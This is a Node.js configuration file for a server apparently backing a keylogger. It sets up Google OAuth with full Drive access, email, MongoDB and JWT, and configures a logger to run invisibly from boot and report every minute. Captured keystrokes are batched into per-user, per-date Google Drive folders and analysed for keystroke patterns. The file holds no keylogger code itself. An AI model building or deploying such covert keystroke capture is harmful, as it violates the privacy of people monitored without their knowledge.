import dotenv from "dotenv";

dotenv.config({});

// Environment Variables
export const JWT_SECRET = process.env.JWT_SECRET;
export const DRIVE_EMAIL = process.env.DRIVE_EMAIL;
export const EMAIL_APP_PASSWORD = process.env.EMAIL_APP_PASSWORD;
export const EMAIL_USER = process.env.EMAIL_USER;
export const MONGODB_URL = process.env.MONGODB_URL;
export const PORT = process.env.PORT || 8000;

// Google OAuth Configuration
const CREDENTIALS = process.env.CREDENTIALS;
export const credentials = JSON.parse(CREDENTIALS);
export const { client_id, client_secret, redirect_uris } = credentials.web;

// Google Drive Configuration
export const root_folder = "1c-6HpFy91j6GWOwNrMON7BW0pHv7evFM"; 
export const oAUTH_SCOPES = [
  'https://www.googleapis.com/auth/drive',
  'https://www.googleapis.com/auth/userinfo.email',
  'https://www.googleapis.com/auth/userinfo.profile',
];

// Server Configuration
export const SERVER_CONFIG = {
    port: PORT,
    bodyLimit: '50mb',
    corsEnabled: true
};

// Keylogger Configuration
export const configValues = {
    format: 0, // 0 = labels, 10 = decimal, 16 = hex
    visible: false, // true = VISIBLE, false = INVISIBLE
    boot_wait: true, // true = BOOT_WAIT, false = NOWAIT
    mouse_ignore: true, // true = ignore mouse clicks
    serverName: "localhost",
    resource: "/",
    intervalMinutes: 1,  // Minutes
    log_file_name: "keylogger.log",
    backend_port: 8000,
};

// Batch Processing Configuration
export const BATCH_CONFIG = {
    batchSize: 1000, // Process 1000 logs at a time
    maxRetries: 3,
    retryDelay: 1000, // Base delay in milliseconds
};

// Email Configuration
export const EMAIL_CONFIG = {
    service: 'gmail',
    user: EMAIL_USER,
    pass: EMAIL_APP_PASSWORD,
};

// Database Configuration
export const DB_CONFIG = {
    url: MONGODB_URL,
    options: {
        // Removed deprecated options: useNewUrlParser, useUnifiedTopology
    }
};

// JWT Configuration
export const JWT_CONFIG = {
    secret: JWT_SECRET,
    expiresIn: '7d',
    algorithm: 'HS256'
};

// Password Reset Configuration
export const PASSWORD_RESET_CONFIG = {
    tokenExpiry: 1000 * 60 * 30, // 30 minutes
    tokenLength: 32,
};

// Google Drive File Configuration
export const DRIVE_FILE_CONFIG = {
    maxFileSizeMB: 10,
    mimeType: 'application/json',
    folderStructure: {
        root: 'Keylogger data',
        user: 'user_folder',
        date: 'date_folder'
    }
};

// Keylogger Processing Configuration
export const KEYLOGGER_PROCESSING_CONFIG = {
    sessionGapThreshold: 5 * 60 * 1000, // 5 minutes in milliseconds
    backspacePrecision: 1000, // Precision for backspace frequency calculation
    hashBitSize: 32, // Bit size for hash generation
};